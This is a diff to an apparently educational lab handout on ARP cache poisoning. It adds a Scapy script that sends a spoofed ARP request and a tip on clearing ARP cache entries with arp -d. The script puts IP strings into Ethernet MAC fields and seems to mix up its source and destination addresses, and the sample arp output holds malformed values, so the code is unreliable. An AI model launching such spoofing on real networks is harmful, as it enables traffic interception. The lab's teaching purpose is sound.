@@ -106,13 +106,33 @@ The objective of this task is to use packet spoofing to launch an ARP cache pois
 #!/usr/bin/env python
 from scapy.all import *
 
-E = Ether()
-A = ARP()
-# 1 for ARP request; 2 for ARP reply
-A.op = 1 
 
-pkt = E/A
-sendp(pkt)
+target_IP = "172.18.123.6"
+target_MAC = "e8:6a:64:ce:4b:df"
+
+fake_IP = "172.18.123.99"
+fake_MAC = "aa:bb:cc:dd:ee:ff"
+
+
+# Construct ethernet header
+ethernet = Ether()
+ethernet.dst = target_IP 
+ethernet.src = fake_IP
+
+# Construct ARP packet
+arp = ARP()
+arp.op = 1                         # 1 for ARP request; 2 for ARP reply
+arp.psrc = target_IP               # IP source
+arp.hwsrc = target_MAC             # MAC source
+arp.pdst = fake_IP                 # IP destination
+arp.hwdst = fake_MAC               # MAC destination
+
+ 
+# Encapsulate the ARP packet in the ethernet frame
+frame = ethernet/arp
+
+# Send the frame
+sendp(frame)
 ```
 
 
@@ -146,6 +166,16 @@ $ arp -n
 Address HWtype HWaddress Flags Mask Iface
 172.18.123.6 ether e8:6a:64:ce:4b:df0 C enp0s
 172.18.123.5 ether e8:6a:64:ce:4c:cd C enp0s
+```
+
+If you need to delete an entry in the ARP cache you can use `arp -d [IP ADDRESS]`. For example:
+
+```shell
+$ sudo arp -d 172.18.123.5
+
+$ arp -n 
+Address HWtype HWaddress Flags Mask Iface
+172.18.123.6 ether e8:6a:64:ce:4b:df0 C enp0s
 ```
 
 There are many ways to conduct ARP cache poisoning attack. Try the following three methods, and report whether each method works or not.
